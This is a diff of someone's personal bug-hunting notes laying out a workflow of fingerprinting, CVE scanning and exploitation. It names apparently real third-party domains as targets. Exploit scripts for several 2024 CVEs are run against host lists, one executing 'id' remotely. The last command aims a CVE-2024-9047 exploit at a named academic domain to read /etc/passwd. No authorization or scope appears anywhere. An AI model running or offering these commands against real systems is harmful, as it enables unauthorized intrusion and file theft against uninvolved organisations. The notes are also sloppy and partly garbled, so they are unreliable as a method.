@@ -1,24 +1,26 @@
 
-✅ 1. Identify the Technology Stack
+--------------------------------------------------------------✅ 1. Identify the Technology Stack---------------------------------------------------------------
 
 Use tech fingerprinting tools to determine what the site is running:
 
-# Best tool for fingerprinting
+# use tools
 whatweb https://target.com
 wappalyzer https://target.com
 nmap -sV -Pn target.com
-
-This gives you:
-    Web servers: Apache, Nginx, IIS, etc.
-    Frameworks: Laravel, Struts, Express, etc.
-    CMS: WordPress, Joomla
-    JS Libraries: jQuery, React versions
-    Backend stack: PHP, ASP.NET, Java, etc.
-
-also analyze httpx results from recon
+nmap -sV -T4 licet.ac.in
 
 
-🧠 2. Use CVE Search Engines
+	This gives you:
+	    Web servers: Apache, Nginx, IIS, etc.
+	    Frameworks: Laravel, Struts, Express, etc.
+	    CMS: WordPress, Joomla
+	    JS Libraries: jQuery, React versions
+	    Backend stack: PHP, ASP.NET, Java, etc.
+
+#also analyze httpx results from recon
+
+
+-----------------------------------------------------------------🧠 2. Use CVE Search Engines----------------------------------------------------------------------
       
 Once you know the stack:
 1.google it eg: jiraa exolit ,jira cve..etc...
@@ -39,45 +41,52 @@ Once you know the stack:
 		php 8.1.1
 
 
-🛠️ 3. Automated Tools to Fetch CVEs
+---------------------------------------------------------------🛠️ 3. Automated Tools to Fetch CVEs----------------------------------------------------------------
 
 You can automate this using:
 
-python3 vulmap.py -u https://target.com --check
-
-✅ nuclei
-
-Run tech-detection and CVE templates:
-
-nuclei -u https://target.com -t cves/ -severity critical,high
-nuclei -u https://target.com -t technologies/ cves/ exposed-panels/ misconfiguration/
+1.nuclei
+nuclei -u https://target.com -t cves/ -severity critical,high -o nuclei_output
+nuclei -u https://target.com -t technologies/,cves/,exposed-panels/,misconfiguration/ -o nuclei_output1
+//output : nuclei_outpu, nuclei_output1
 
 
-jaelea:
-jaeles -u https://selzy.com scan
+2.jaeles
+jaeles:
+cat oi | jaeles scan -c 100 
+//output folder: out
+
+1.oneforall: =>analyzing
+ python3 oneforall.py --targets ./domains.txt run
 
 
-1.oneforall:
-python3 oneforall.py  --target selzy.com  run
-
-2.scanforall:
-./scan4all -l domains.txt -o output
-
-3.cve-2024-34102:
-python3 cve-2024-34102-adobe.py  -u https://api-mp.us.lg.com/
+2.scanforall: => analyzing
+./scan4all -l domains.txt | tee scan4all_output
+//output: scan4all_output
 
 lazyhunter: input:ip
-python3 lazyhunter.py -f oi
+python3 lazyhunter.py -f oi | tee lazy_output
+//output: lazy_output
+
+
+6.CVE-2024-24919
+CVE-2024-24919.sh -w domains | tee output_2024-24919
+//output:output_2024-24919
+
+7.cve-2024-4358
+python3 cve-2024-4358 -l targets.txt -c "id" | tee output_2024-4358
+//output:output_2024-4358
+
+
+
+
+man:
 
 4.inurl:"/geoserver/ows?service=wfs" site:*.gov "target"
 nuclei -l urls_endpoints.txt -tags geoserver -severity critical,high,medium
 
 5.intitle:dashboard-confluence "target" (#related CVE: CVE-2019-3396)
 
-
-
-
-
-
-see infodisclosure/cves
+8. cve-2024-9047
+./cve-2024-9047.sh https://licet.ac.in /etc/passwd
 
